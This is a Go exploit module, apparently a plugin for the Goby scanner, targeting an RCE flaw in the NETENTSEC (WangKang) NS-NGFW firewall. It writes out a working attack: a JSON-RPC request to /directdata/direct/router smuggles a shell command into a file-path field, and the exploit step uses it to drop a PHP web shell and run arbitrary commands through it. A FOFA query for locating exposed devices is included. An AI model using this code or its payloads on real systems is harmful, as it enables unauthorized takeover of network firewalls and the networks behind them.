package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "NETENTSEC(WangKang) firewall NS-NGFW RCE",
    "Description": "WangKang File upload vulnerability exists in the NGFW foreground of the next generation firewall",
    "Product": "NS-NGFW-firewall",
    "Homepage": "https://www.netentsec.com/",
    "DisclosureDate": "2021-04-08",
    "Author": "go0p",
    "FofaQuery": "app=\"网康科技-下一代防火墙\" || product=\"netentsec Technology - Next Generation Firewall\" || app=\"netentsec Technology - Next Generation Firewall\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "cmd",
            "Type": "input",
            "Value": "whoami"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "NETENTSEC-NGFW"
        ]
    },
    "PocId": "10178"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomHexStr := goutils.RandomHexString(8)
			randomHexName := goutils.RandomHexString(5)
			payload := fmt.Sprintf(`{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '%s'>/var/www/html/%s.txt"]}],"type":"rpc","tid":17}`, randomHexStr, randomHexName)
			cfg := httpclient.NewPostRequestConfig("/directdata/direct/router")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.VerifyTls = false
			cfg.Data = payload
			if resp1, err1 := httpclient.DoHttpRequest(u, cfg); err1 == nil && strings.Contains(resp1.RawBody, "\"success\":true") {
				time.Sleep(time.Second * 1)
				if resp, err := httpclient.SimpleGet(fmt.Sprintf(u.FixedHostInfo+"/%s.txt", randomHexName)); err == nil && strings.Contains(resp.RawBody, randomHexStr) {
					ss.VulURL = u.String() + fmt.Sprintf("/%s.txt", randomHexName)
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randomHexName := goutils.RandomHexString(4)
			randomHexPwd := goutils.RandomHexString(3)
			payload := fmt.Sprintf(`{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php\nsystem($_GET[%s]);'>/var/www/html/%s.php"]}],"type":"rpc","tid":17}`, randomHexPwd, randomHexName)
			cfg := httpclient.NewPostRequestConfig("/directdata/direct/router")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.VerifyTls = false
			cfg.Data = payload
			fmt.Println(payload)
			if resp1, err1 := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err1 == nil && strings.Contains(resp1.RawBody, "\"success\":true") {
				time.Sleep(time.Second * 1)
				if resp, err := httpclient.SimpleGet(fmt.Sprintf(expResult.HostInfo.FixedHostInfo+"/%s.php?%s=%s", randomHexName, randomHexPwd, ss.Params["cmd"].(string))); err == nil && len(resp.RawBody) != 0 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
